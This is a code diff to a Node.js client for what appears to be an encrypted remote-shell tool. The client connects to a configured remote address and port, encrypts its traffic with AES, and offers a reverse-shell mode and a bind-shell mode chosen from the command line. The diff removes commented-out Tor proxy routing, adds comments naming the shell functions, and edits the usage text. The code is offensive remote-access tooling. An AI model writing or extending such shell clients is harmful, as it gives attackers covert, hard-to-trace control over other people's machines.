@@ -4,18 +4,6 @@ const { spawn } = require("child_process")
 const { CryptorAES } = require('./crypt')
 const { remote_address, remote_port, aes_password, aes_iv } = require('./client_config.json');
 
-// TOR routing
-/* const https = require("https");
-const { SocksProxyAgent } = require("socks-proxy-agent");
-
-const agent = new SocksProxyAgent("socks5h://192.168.137.133:9050");
-
-https.get("https://ifconfig.me", {
-  agent
-}, res => {
-  res.pipe(process.stdout);
-}); */
-
 const crypt = new CryptorAES(aes_password, aes_iv)
 
 const config = {
@@ -23,17 +11,20 @@ const config = {
     port: remote_port
 }
 
+//convert text to encrypted buffer
 function translate_out(cleartext){
     const buffer = Buffer.from(cleartext, 'utf-8')
     const encrypted = crypt.encrypt(buffer)
     return(encrypted)
 }
 
+//convert encrypted buffer to text
 function translate_in(encBuff){
     const decrypted = crypt.decrypt(encBuff).toString('utf-8')
     return(decrypted)
 }
 
+// Bind shell
 function Bind (){
     const client = createConnection(config, () => {
         const int = createInterface({
@@ -71,6 +62,7 @@ function Bind (){
     });
 }
 
+// Reverse shell
 function Reverse (){
     const client = createConnection(config, () => {
         let shellcmd = undefined
@@ -131,8 +123,8 @@ switch(process.argv[2]){
         Reverse()
         break
     default:
-        const helpText = "Define an operating mode!\n"
-        + "usage:\n"
+        const helpText = "Op mode not defined!\n"
+        + "Usage:\n"
         + "node client r (Reverse connection)\n"
         + "node client b (Bind connection)"
         
